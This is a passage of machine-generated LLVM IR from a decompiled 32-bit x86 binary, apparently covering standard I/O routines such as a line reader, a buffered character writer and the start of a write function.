dec_label_pc_804cbe2:                             ; preds = %dec_label_pc_804cbd3
  %v1_804cbe6 = call i32 @function_804bcc0(i32 %v0_804cbe5)
  %v1_804cbee = icmp eq i32 %v1_804cbe6, 0
  br i1 %v1_804cbee, label %dec_label_pc_804cbf7, label %dec_label_pc_804cbf2

dec_label_pc_804cbf2:                             ; preds = %dec_label_pc_804cbe2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804cc01

dec_label_pc_804cbf7:                             ; preds = %dec_label_pc_804cbe2
  %v0_804cbf7 = load i32, i32* @esi, align 4
  %v1_804cbf7 = inttoptr i32 %v0_804cbf7 to i16*
  %v2_804cbf7 = load i16, i16* %v1_804cbf7, align 2
  %v3_804cbf7 = and i16 %v2_804cbf7, -65
  store i16 %v3_804cbf7, i16* %v1_804cbf7, align 2
  %v0_804cbfb = load i32, i32* @esi, align 4
  %v1_804cbfb = add i32 %v0_804cbfb, 8
  %v2_804cbfb = inttoptr i32 %v1_804cbfb to i32*
  %v3_804cbfb = load i32, i32* %v2_804cbfb, align 4
  %v2_804cbfe = add i32 %v0_804cbfb, 28
  %v3_804cbfe = inttoptr i32 %v2_804cbfe to i32*
  store i32 %v3_804cbfb, i32* %v3_804cbfe, align 4
  br label %dec_label_pc_804cc01

dec_label_pc_804cc01:                             ; preds = %dec_label_pc_804cbd3, %dec_label_pc_804cbf2, %dec_label_pc_804cbf7
  %v0_804cc01 = load i32, i32* @global_var_80557d0.115, align 16
  %v9_804cc01 = icmp eq i32 %v0_804cc01, 2
  br i1 %v9_804cc01, label %dec_label_pc_804cc1b, label %dec_label_pc_804cc0a

dec_label_pc_804cc0a:                             ; preds = %dec_label_pc_804cc01
  store i32 %v2_804cb47, i32* @eax, align 4
  %v2_804cc13 = call i32 @function_804ec6e(i32 %v2_804cb47, i32 1)
  br label %dec_label_pc_804cc1b

dec_label_pc_804cc1b:                             ; preds = %dec_label_pc_804cc01, %dec_label_pc_804cba6, %dec_label_pc_804cc0a
  %v0_804cc1b = load i32, i32* @esi, align 4
  %v1_804cc1b = add i32 %v0_804cc1b, 32
  %v2_804cc1b = inttoptr i32 %v1_804cc1b to i32*
  %v3_804cc1b = load i32, i32* %v2_804cc1b, align 4
  store i32 %v3_804cc1b, i32* @esi, align 4
  %v1_804cc1e = icmp eq i32 %v3_804cc1b, 0
  %v1_804cc20 = icmp eq i1 %v1_804cc1e, false
  br i1 %v1_804cc20, label %dec_label_pc_804cba6, label %dec_label_pc_804cc22

dec_label_pc_804cc22:                             ; preds = %dec_label_pc_804cc1b, %dec_label_pc_804cb3a
  %v0_804cc22 = call i32 @function_804ca34()
  br label %dec_label_pc_804cc4f

dec_label_pc_804cc29:                             ; preds = %dec_label_pc_804cb2d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804cc2b = load i8, i8* %tmp23, align 1
  %v4_804cc2b = and i8 %v3_804cc2b, 64
  %v5_804cc2b = icmp eq i8 %v4_804cc2b, 0
  br i1 %v5_804cc2b, label %dec_label_pc_804cc4f, label %dec_label_pc_804cc30

dec_label_pc_804cc30:                             ; preds = %dec_label_pc_804cc29
  store i32 -1, i32* @edi, align 4
  %v1_804cc37 = call i32 @function_804bcc0(i32 %v4_804cb21)
  %v1_804cc3f = icmp eq i32 %v1_804cc37, 0
  %v1_804cc41 = icmp eq i1 %v1_804cc3f, false
  br i1 %v1_804cc41, label %dec_label_pc_804cc4f, label %dec_label_pc_804cc43

dec_label_pc_804cc43:                             ; preds = %dec_label_pc_804cc30
  %v3_804cc43 = load i16, i16* %arg1, align 2
  %v4_804cc43 = and i16 %v3_804cc43, -65
  store i16 %v4_804cc43, i16* %arg1, align 2
  %v2_804cc47 = add i32 %v4_804cb21, 8
  %v3_804cc47 = inttoptr i32 %v2_804cc47 to i32*
  %v4_804cc47 = load i32, i32* %v3_804cc47, align 4
  %v3_804cc4a = add i32 %v4_804cb21, 28
  %v4_804cc4a = inttoptr i32 %v3_804cc4a to i32*
  store i32 %v4_804cc47, i32* %v4_804cc4a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804cc4f

dec_label_pc_804cc4f:                             ; preds = %dec_label_pc_804cc30, %dec_label_pc_804cc29, %dec_label_pc_804cc22, %dec_label_pc_804cc43
  %v0_804cc52 = load i32, i32* @edi, align 4
  store i32 %v0_804cb1b, i32* @ebx, align 4
  store i32 %v0_804cb1a, i32* @esi, align 4
  store i32 %v0_804cb19, i32* @edi, align 4
  store i32 %v0_804cb18, i32* @ebp, align 4
  ret i32 %v0_804cc52

; uselistorder directives
  uselistorder i32 %v3_804cc1b, { 1, 2, 0 }
  uselistorder i32 %v2_804cb47, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_804ca34, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805579c.117 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8055e80.108, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80557b8.107 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804cc4f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cc1b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cc01, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cbd3, { 1, 0 }
  uselistorder label %dec_label_pc_804cba6, { 1, 0 }
}

define i32 @function_804cc5c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cc5c:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cc5c = load i32, i32* @ebp, align 4
  %v4_804cc63 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cc63, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804cc63, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804ccad.preheader, label %dec_label_pc_804ccb9

dec_label_pc_804ccad.preheader:                   ; preds = %dec_label_pc_804cc5c
  %v1_804ccad19 = add i32 %arg2, -1
  %v8_804ccad20 = icmp eq i32 %v1_804ccad19, 0
  store i32 %v1_804ccad19, i32* @esi, align 4
  %v1_804ccae21 = icmp eq i1 %v8_804ccad20, false
  br i1 %v1_804ccae21, label %dec_label_pc_804cc77, label %dec_label_pc_804ccb0

dec_label_pc_804cc77:                             ; preds = %dec_label_pc_804ccad.preheader, %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge.dec_label_pc_804cc77_crit_edge
  %v0_804cc77 = phi i32 [ %v0_804cc77.pre, %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge.dec_label_pc_804cc77_crit_edge ], [ %arg3, %dec_label_pc_804ccad.preheader ]
  %v1_804cc77 = add i32 %v0_804cc77, 16
  %v2_804cc77 = inttoptr i32 %v1_804cc77 to i32*
  %v3_804cc77 = load i32, i32* %v2_804cc77, align 4
  store i32 %v3_804cc77, i32* %eax.global-to-local, align 4
  %v2_804cc7a = add i32 %v0_804cc77, 24
  %v3_804cc7a = inttoptr i32 %v2_804cc7a to i32*
  %v4_804cc7a = load i32, i32* %v3_804cc7a, align 4
  %v10_804cc7a = icmp ult i32 %v3_804cc77, %v4_804cc7a
  %v1_804cc7d = icmp eq i1 %v10_804cc7a, false
  br i1 %v1_804cc7d, label %dec_label_pc_804cc8d, label %dec_label_pc_804cc7f

dec_label_pc_804cc7f:                             ; preds = %dec_label_pc_804cc77
  %v1_804cc7f = inttoptr i32 %v3_804cc77 to i8*
  %v2_804cc7f = load i8, i8* %v1_804cc7f, align 1
  %v3_804cc7f = zext i8 %v2_804cc7f to i32
  %v4_804cc7f = load i32, i32* @edx, align 4
  %v5_804cc7f = and i32 %v4_804cc7f, -256
  %v6_804cc7f = or i32 %v5_804cc7f, %v3_804cc7f
  store i32 %v6_804cc7f, i32* @edx, align 4
  %v1_804cc81 = add i32 %v3_804cc77, 1
  store i32 %v1_804cc81, i32* %eax.global-to-local, align 4
  %v2_804cc82 = load i32, i32* @ebx, align 4
  %v3_804cc82 = inttoptr i32 %v2_804cc82 to i8*
  store i8 %v2_804cc7f, i8* %v3_804cc82, align 1
  %v0_804cc84 = load i32, i32* @ebx, align 4
  %v1_804cc84 = add i32 %v0_804cc84, 1
  store i32 %v1_804cc84, i32* @ebx, align 4
  %v0_804cc85 = load i32, i32* @edx, align 4
  %v1_804cc85 = trunc i32 %v0_804cc85 to i8
  %v10_804cc85 = icmp eq i8 %v1_804cc85, 10
  %v0_804cc88 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc88 = load i32, i32* @ebp, align 4
  %v2_804cc88 = add i32 %v1_804cc88, 16
  %v3_804cc88 = inttoptr i32 %v2_804cc88 to i32*
  store i32 %v0_804cc88, i32* %v3_804cc88, align 4
  br i1 %v10_804cc85, label %dec_label_pc_804ccb0, label %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge

dec_label_pc_804cc8d:                             ; preds = %dec_label_pc_804cc77
  %v0_804cc91 = call i32 @function_804fee0()
  %v1_804cc91 = trunc i32 %v0_804cc91 to i8
  store i32 %v0_804cc91, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804cc91, 256
  %v11_804cc99 = icmp eq i32 %sext.mask, 255
  %v1_804cc9c = icmp eq i1 %v11_804cc99, false
  br i1 %v1_804cc9c, label %dec_label_pc_804ccab, label %dec_label_pc_804cc9e

dec_label_pc_804cc9e:                             ; preds = %dec_label_pc_804cc8d
  %v0_804cc9e = load i32, i32* @ebp, align 4
  %v1_804cc9e = inttoptr i32 %v0_804cc9e to i8*
  %v2_804cc9e = load i8, i8* %v1_804cc9e, align 1
  %v3_804cc9e = and i8 %v2_804cc9e, 8
  %v4_804cc9e = icmp eq i8 %v3_804cc9e, 0
  br i1 %v4_804cc9e, label %dec_label_pc_804ccb0, label %dec_label_pc_804ccb9

dec_label_pc_804ccab:                             ; preds = %dec_label_pc_804cc8d
  %v3_804cca6 = load i32, i32* @ebx, align 4
  %v4_804cca6 = inttoptr i32 %v3_804cca6 to i8*
  store i8 %v1_804cc91, i8* %v4_804cca6, align 1
  %v0_804cca8 = load i32, i32* @ebx, align 4
  %v1_804cca8 = add i32 %v0_804cca8, 1
  store i32 %v1_804cca8, i32* @ebx, align 4
  %v11_804cca9 = icmp eq i8 %v1_804cc91, 10
  br i1 %v11_804cca9, label %dec_label_pc_804ccb0, label %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge

dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge: ; preds = %dec_label_pc_804cc7f, %dec_label_pc_804ccab
  %v0_804ccad.pre = load i32, i32* @esi, align 4
  %v1_804ccad = add i32 %v0_804ccad.pre, -1
  %v8_804ccad = icmp eq i32 %v1_804ccad, 0
  store i32 %v1_804ccad, i32* @esi, align 4
  %v1_804ccae = icmp eq i1 %v8_804ccad, false
  br i1 %v1_804ccae, label %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge.dec_label_pc_804cc77_crit_edge, label %dec_label_pc_804ccb0

dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge.dec_label_pc_804cc77_crit_edge: ; preds = %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge
  %v0_804cc77.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cc77

dec_label_pc_804ccb0:                             ; preds = %dec_label_pc_804ccad.preheader, %dec_label_pc_804cc7f, %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge, %dec_label_pc_804ccab, %dec_label_pc_804cc9e
  %v0_804ccb0 = load i32, i32* @ebx, align 4
  %v1_804ccb0 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804ccb0, %v1_804ccb0
  br i1 %tmp23, label %dec_label_pc_804ccb4, label %dec_label_pc_804ccb9

dec_label_pc_804ccb4:                             ; preds = %dec_label_pc_804ccb0
  %v1_804ccb4 = inttoptr i32 %v0_804ccb0 to i8*
  store i8 0, i8* %v1_804ccb4, align 1
  %v0_804ccbe.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ccbb

dec_label_pc_804ccb9:                             ; preds = %dec_label_pc_804ccb0, %dec_label_pc_804cc9e, %dec_label_pc_804cc5c
  br label %dec_label_pc_804ccbb

dec_label_pc_804ccbb:                             ; preds = %dec_label_pc_804ccb4, %dec_label_pc_804ccb9
  %v0_804ccbe = phi i32 [ %v0_804ccbe.pre, %dec_label_pc_804ccb4 ], [ 0, %dec_label_pc_804ccb9 ]
  store i32 %v0_804ccbe, i32* %eax.global-to-local, align 4
  store i32 %v0_804cc5c, i32* @ebp, align 4
  ret i32 %v0_804ccbe

; uselistorder directives
  uselistorder i32 %v0_804ccbe, { 1, 0 }
  uselistorder i32 %v0_804ccb0, { 1, 0 }
  uselistorder i32 %v1_804ccad, { 1, 0 }
  uselistorder i32 %v0_804cc91, { 0, 2, 1 }
  uselistorder i32 %v0_804cc77, { 1, 0 }
  uselistorder label %dec_label_pc_804ccbb, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb0, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804ccab.dec_label_pc_804ccad_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804cc77, { 1, 0 }
}

define i32 @function_804ccc8(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ccc8:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804ccc8 = load i32, i32* @esi, align 4
  %v0_804ccc9 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804ccd1 = sext i8 %arg1 to i32
  store i32 %v4_804ccd1, i32* @esi, align 4
  %v1_804ccd5 = add i32 %arg2, 16
  %v2_804ccd5 = inttoptr i32 %v1_804ccd5 to i32*
  %v3_804ccd5 = load i32, i32* %v2_804ccd5, align 4
  store i32 %v3_804ccd5, i32* %eax.global-to-local, align 4
  %v2_804ccd8 = add i32 %arg2, 28
  %v3_804ccd8 = inttoptr i32 %v2_804ccd8 to i32*
  %v4_804ccd8 = load i32, i32* %v3_804ccd8, align 4
  %v10_804ccd8 = icmp ult i32 %v3_804ccd5, %v4_804ccd8
  %v1_804ccdb = icmp eq i1 %v10_804ccd8, false
  br i1 %v1_804ccdb, label %dec_label_pc_804ccea, label %dec_label_pc_804ccdd

dec_label_pc_804ccdd:                             ; preds = %dec_label_pc_804ccc8
  store i32 %v4_804ccd1, i32* @edx, align 4
  %v3_804ccdf = inttoptr i32 %v3_804ccd5 to i8*
  store i8 %arg1, i8* %v3_804ccdf, align 1
  %v0_804cce1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cce1 = add i32 %v0_804cce1, 1
  store i32 %v1_804cce1, i32* %eax.global-to-local, align 4
  %v1_804cce2 = load i32, i32* @ebx, align 4
  %v2_804cce2 = add i32 %v1_804cce2, 16
  %v3_804cce2 = inttoptr i32 %v2_804cce2 to i32*
  store i32 %v1_804cce1, i32* %v3_804cce2, align 4
  %v0_804cd7f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804cd7f

dec_label_pc_804ccea:                             ; preds = %dec_label_pc_804ccc8
  %v1_804ccea = inttoptr i32 %arg2 to i16*
  %v2_804ccea = load i16, i16* %v1_804ccea, align 2
  %v3_804ccea = zext i16 %v2_804ccea to i32
  %v1_804cced = and i32 %v3_804ccea, 192
  store i32 %v1_804cced, i32* %eax.global-to-local, align 4
  %v6_804ccf2 = icmp eq i32 %v1_804cced, 192
  br i1 %v6_804ccf2, label %dec_label_pc_804cd0d, label %dec_label_pc_804ccf9

dec_label_pc_804ccf9:                             ; preds = %dec_label_pc_804ccea
  %v0_804ccf9 = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_804ccf9, 16777216
  %v5_804cd01 = sdiv i32 %sext, 16777216
  %v7_804cd01 = call i32 @function_804f710(i16* %v1_804ccea, i32 128, i32 %v0_804ccf9, i32 %v5_804cd01)
  store i32 %v7_804cd01, i32* %eax.global-to-local, align 4
  %v1_804cd09 = icmp eq i32 %v7_804cd01, 0
  %v1_804cd0b = icmp eq i1 %v1_804cd09, false
  br i1 %v1_804cd0b, label %dec_label_pc_804cd84, label %dec_label_pc_804ccf9.dec_label_pc_804cd0d_crit_edge

dec_label_pc_804ccf9.dec_label_pc_804cd0d_crit_edge: ; preds = %dec_label_pc_804ccf9
  %v0_804cd0d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cd0d

dec_label_pc_804cd0d:                             ; preds = %dec_label_pc_804ccf9.dec_label_pc_804cd0d_crit_edge, %dec_label_pc_804ccea
  %v0_804cd70 = phi i32 [ %v0_804cd0d.pre, %dec_label_pc_804ccf9.dec_label_pc_804cd0d_crit_edge ], [ %arg2, %dec_label_pc_804ccea ]
  %v1_804cd0d = add i32 %v0_804cd70, 4
  %v2_804cd0d = inttoptr i32 %v1_804cd0d to i32*
  %v3_804cd0d = load i32, i32* %v2_804cd0d, align 4
  %v13_804cd0d = icmp eq i32 %v3_804cd0d, -2
  %v1_804cd11 = icmp eq i1 %v13_804cd0d, false
  br i1 %v1_804cd11, label %dec_label_pc_804cd1a, label %dec_label_pc_804cd13

dec_label_pc_804cd13:                             ; preds = %dec_label_pc_804cd0d
  %v0_804cd13 = load i32, i32* @esi, align 4
  store i32 %v0_804cd13, i32* @ecx, align 4
  %v1_804cd15 = urem i32 %v0_804cd13, 256
  store i32 %v1_804cd15, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd87

dec_label_pc_804cd1a:                             ; preds = %dec_label_pc_804cd0d
  %v1_804cd1a = add i32 %v0_804cd70, 12
  %v2_804cd1a = inttoptr i32 %v1_804cd1a to i32*
  %v3_804cd1a = load i32, i32* %v2_804cd1a, align 4
  store i32 %v3_804cd1a, i32* %eax.global-to-local, align 4
  %v2_804cd1d = add i32 %v0_804cd70, 8
  %v3_804cd1d = inttoptr i32 %v2_804cd1d to i32*
  %v4_804cd1d = load i32, i32* %v3_804cd1d, align 4
  %v15_804cd1d = icmp eq i32 %v3_804cd1a, %v4_804cd1d
  br i1 %v15_804cd1d, label %dec_label_pc_804cd62, label %dec_label_pc_804cd22

dec_label_pc_804cd22:                             ; preds = %dec_label_pc_804cd1a
  %v2_804cd22 = add i32 %v0_804cd70, 16
  %v3_804cd22 = inttoptr i32 %v2_804cd22 to i32*
  %v4_804cd22 = load i32, i32* %v3_804cd22, align 4
  %v15_804cd22 = icmp eq i32 %v3_804cd1a, %v4_804cd22
  %v1_804cd25 = icmp eq i1 %v15_804cd22, false
  br i1 %v1_804cd25, label %dec_label_pc_804cd37, label %dec_label_pc_804cd27

dec_label_pc_804cd27:                             ; preds = %dec_label_pc_804cd22
  %v2_804cd2b = call i32 @function_804bcc0(i32 %v0_804cd70)
  store i32 %v2_804cd2b, i32* %eax.global-to-local, align 4
  %v1_804cd33 = icmp eq i32 %v2_804cd2b, 0
  %v1_804cd35 = icmp eq i1 %v1_804cd33, false
  br i1 %v1_804cd35, label %dec_label_pc_804cd84, label %dec_label_pc_804cd27.dec_label_pc_804cd37_crit_edge

dec_label_pc_804cd27.dec_label_pc_804cd37_crit_edge: ; preds = %dec_label_pc_804cd27
  %v0_804cd37.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cd37

dec_label_pc_804cd37:                             ; preds = %dec_label_pc_804cd27.dec_label_pc_804cd37_crit_edge, %dec_label_pc_804cd22
  %v0_804cd37 = phi i32 [ %v0_804cd37.pre, %dec_label_pc_804cd27.dec_label_pc_804cd37_crit_edge ], [ %v0_804cd70, %dec_label_pc_804cd22 ]
  %v1_804cd37 = add i32 %v0_804cd37, 16
  %v2_804cd37 = inttoptr i32 %v1_804cd37 to i32*
  %v3_804cd37 = load i32, i32* %v2_804cd37, align 4
  store i32 %v3_804cd37, i32* %eax.global-to-local, align 4
  %v0_804cd3a = load i32, i32* @esi, align 4
  store i32 %v0_804cd3a, i32* %edx.global-to-local, align 4
  %v1_804cd3c = trunc i32 %v0_804cd3a to i8
  %v3_804cd3c = inttoptr i32 %v3_804cd37 to i8*
  store i8 %v1_804cd3c, i8* %v3_804cd3c, align 1
  %v0_804cd3e = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd3e = add i32 %v0_804cd3e, 1
  store i32 %v1_804cd3e, i32* %eax.global-to-local, align 4
  %v1_804cd3f = load i32, i32* @ebx, align 4
  %v2_804cd3f = add i32 %v1_804cd3f, 16
  %v3_804cd3f = inttoptr i32 %v2_804cd3f to i32*
  store i32 %v1_804cd3e, i32* %v3_804cd3f, align 4
  %v0_804cd42 = load i32, i32* @ebx, align 4
  %v1_804cd42 = add i32 %v0_804cd42, 1
  %v2_804cd42 = inttoptr i32 %v1_804cd42 to i8*
  %v3_804cd42 = load i8, i8* %v2_804cd42, align 1
  %v4_804cd42 = urem i8 %v3_804cd42, 2
  %v5_804cd42 = icmp eq i8 %v4_804cd42, 0
  br i1 %v5_804cd42, label %dec_label_pc_804cd7d, label %dec_label_pc_804cd48

dec_label_pc_804cd48:                             ; preds = %dec_label_pc_804cd37
  %v0_804cd48 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd48 = trunc i32 %v0_804cd48 to i8
  %v10_804cd48 = icmp eq i8 %v1_804cd48, 10
  %v1_804cd4b = icmp eq i1 %v10_804cd48, false
  br i1 %v1_804cd4b, label %dec_label_pc_804cd7d, label %dec_label_pc_804cd4d

dec_label_pc_804cd4d:                             ; preds = %dec_label_pc_804cd48
  %v2_804cd51 = call i32 @function_804bcc0(i32 %v0_804cd42)
  store i32 %v2_804cd51, i32* %eax.global-to-local, align 4
  %v1_804cd59 = icmp eq i32 %v2_804cd51, 0
  br i1 %v1_804cd59, label %dec_label_pc_804cd7d, label %dec_label_pc_804cd5d

dec_label_pc_804cd5d:                             ; preds = %dec_label_pc_804cd4d
  %v0_804cd5d = load i32, i32* @ebx, align 4
  %v1_804cd5d = add i32 %v0_804cd5d, 16
  %v2_804cd5d = inttoptr i32 %v1_804cd5d to i32*
  %v3_804cd5d = load i32, i32* %v2_804cd5d, align 4
  %v4_804cd5d = add i32 %v3_804cd5d, -1
  store i32 %v4_804cd5d, i32* %v2_804cd5d, align 4
  br label %dec_label_pc_804cd84

dec_label_pc_804cd62:                             ; preds = %dec_label_pc_804cd1a
  %v0_804cd62 = load i32, i32* @esi, align 4
  %v6_804cd64 = trunc i32 %v0_804cd62 to i8
  store i8 %v6_804cd64, i8* %stack_var_-9, align 1
  %v2_804cd6b = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804cd6b, i32* %eax.global-to-local, align 4
  %v5_804cd70 = inttoptr i32 %v0_804cd70 to i16*
  %sext10 = mul i32 %v0_804cd62, 16777216
  %v5_804cd71 = sdiv i32 %sext10, 16777216
  %v7_804cd71 = call i32 @function_804f5a0(i16* %v5_804cd70, i32 %v2_804cd6b, i32 1, i32 %v5_804cd71)
  store i32 %v7_804cd71, i32* %eax.global-to-local, align 4
  %v1_804cd79 = icmp eq i32 %v7_804cd71, 0
  br i1 %v1_804cd79, label %dec_label_pc_804cd84, label %dec_label_pc_804cd7d

dec_label_pc_804cd7d:                             ; preds = %dec_label_pc_804cd62, %dec_label_pc_804cd4d, %dec_label_pc_804cd48, %dec_label_pc_804cd37
  %v0_804cd7d = load i32, i32* @esi, align 4
  store i32 %v0_804cd7d, i32* @edx, align 4
  br label %dec_label_pc_804cd7f

dec_label_pc_804cd7f:                             ; preds = %dec_label_pc_804ccdd, %dec_label_pc_804cd7d
  %v0_804cd7f = phi i32 [ %v0_804cd7f.pre, %dec_label_pc_804ccdd ], [ %v0_804cd7d, %dec_label_pc_804cd7d ]
  %v1_804cd7f = urem i32 %v0_804cd7f, 256
  store i32 %v1_804cd7f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd87

dec_label_pc_804cd84:                             ; preds = %dec_label_pc_804cd62, %dec_label_pc_804cd27, %dec_label_pc_804ccf9, %dec_label_pc_804cd5d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd87

dec_label_pc_804cd87:                             ; preds = %dec_label_pc_804cd7f, %dec_label_pc_804cd13, %dec_label_pc_804cd84
  %v0_804cd8c = phi i32 [ %v1_804cd7f, %dec_label_pc_804cd7f ], [ %v1_804cd15, %dec_label_pc_804cd13 ], [ -1, %dec_label_pc_804cd84 ]
  store i32 %v0_804ccc9, i32* @ebx, align 4
  store i32 %v0_804ccc8, i32* @esi, align 4
  ret i32 %v0_804cd8c

; uselistorder directives
  uselistorder i32 %v1_804cd7f, { 1, 0 }
  uselistorder i32 %v1_804cd15, { 1, 0 }
  uselistorder i32 %v0_804cd70, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_804ccf9, { 1, 0 }
  uselistorder label %dec_label_pc_804cd87, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd84, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804cd7f, { 1, 0 }
}

define i32 @function_804cd90() local_unnamed_addr {
dec_label_pc_804cd90:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804cd90 = load i32, i32* @esi, align 4
  %v0_804cd91 = load i32, i32* @ebx, align 4
  store i32 %v0_804cd91, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v1_804cd9a = inttoptr i32 %tmp2 to i8*
  %v2_804cd9a = call i32 @function_804ce94(i8* %v1_804cd9a)
  store i32 %v2_804cd9a, i32* @esi, align 4
  %v0_804cdab = load i32, i32* @ebx, align 4
  %v5_804cdac = call i32 @function_804cdc4(i32 %v0_804cdab, i64 1, i32 %v2_804cd9a, i32 %tmp)
  %v1_804cdb7 = load i32, i32* @esi, align 4
  %v12_804cdb7 = icmp eq i32 %v5_804cdac, %v1_804cdb7
  %v1_804cdb9 = icmp eq i1 %v12_804cdb7, false
  br i1 %v1_804cdb9, label %dec_label_pc_804cdbd, label %dec_label_pc_804cdbb

dec_label_pc_804cdbb:                             ; preds = %dec_label_pc_804cd90
  br label %dec_label_pc_804cdbd

dec_label_pc_804cdbd:                             ; preds = %dec_label_pc_804cd90, %dec_label_pc_804cdbb
  %v0_804cdbd = phi i32 [ -1, %dec_label_pc_804cd90 ], [ %v5_804cdac, %dec_label_pc_804cdbb ]
  %v2_804cdc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804cdc0, i32* @ebx, align 4
  store i32 %v0_804cd90, i32* @esi, align 4
  ret i32 %v0_804cdbd

; uselistorder directives
  uselistorder i32 %v5_804cdac, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_804cdbd, { 1, 0 }
}

define i32 @function_804cdc4(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cdc4:
  %stack_var_-28 = alloca i32, align 4
  %v0_804cdc4 = load i32, i32* @edi, align 4
  %v0_804cdc5 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804cdcb = trunc i64 %arg2 to i32
  store i32 %v4_804cdcb, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804cdd3 = inttoptr i32 %arg4 to i16*
  %v2_804cdd3 = load i16, i16* %v1_804cdd3, align 2
  %v1_804cdd6 = and i16 %v2_804cdd3, 192
  %v6_804cddb = icmp eq i16 %v1_804cdd6, 192
  br i1 %v6_804cddb, label %dec_label_pc_804cdf6, label %dec_label_pc_804cde2

dec_label_pc_804cde2:                             ; preds = %dec_label_pc_804cdc4
  %v0_804cde2 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804cdea = call i32 @function_804f710(i16* %v1_804cdd3, i32 128, i32 %v0_804cde2, i32 %v0_804cde2)
  %v1_804cdf2 = icmp eq i32 %v6_804cdea, 0
  %v1_804cdf4 = icmp eq i1 %v1_804cdf2, false
  br i1 %v1_804cdf4, label %dec_label_pc_804ce32, label %dec_label_pc_804cdf6

dec_label_pc_804cdf6:                             ; preds = %dec_label_pc_804cde2, %dec_label_pc_804cdc4
  %v2_804cdf6 = icmp eq i32 %v4_804cdcb, 0
  br i1 %v2_804cdf6, label %dec_label_pc_804ce32, label %dec_label_pc_804cdfa

dec_label_pc_804cdfa:                             ; preds = %dec_label_pc_804cdf6
  %v1_804cdfa = icmp eq i32 %arg3, 0
  br i1 %v1_804cdfa, label %dec_label_pc_804ce32, label %dec_label_pc_804cdfe

dec_label_pc_804cdfe:                             ; preds = %dec_label_pc_804cdfa
  %v9_804ce03 = udiv i64 4294967295, %arg2
  %v10_804ce03 = trunc i64 %v9_804ce03 to i32
  %v6_804ce07 = icmp ult i32 %v10_804ce03, %arg3
  br i1 %v6_804ce07, label %dec_label_pc_804ce23, label %dec_label_pc_804ce09

dec_label_pc_804ce09:                             ; preds = %dec_label_pc_804cdfe
  %sext = mul i64 %arg2, 4294967296
  %v2_804ce0c = sdiv i64 %sext, 4294967296
  %v3_804ce0c = sext i32 %arg3 to i64
  %v4_804ce0c = mul nsw i64 %v3_804ce0c, %v2_804ce0c
  %v5_804ce0c = trunc i64 %v4_804ce0c to i32
  %v0_804ce0f = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
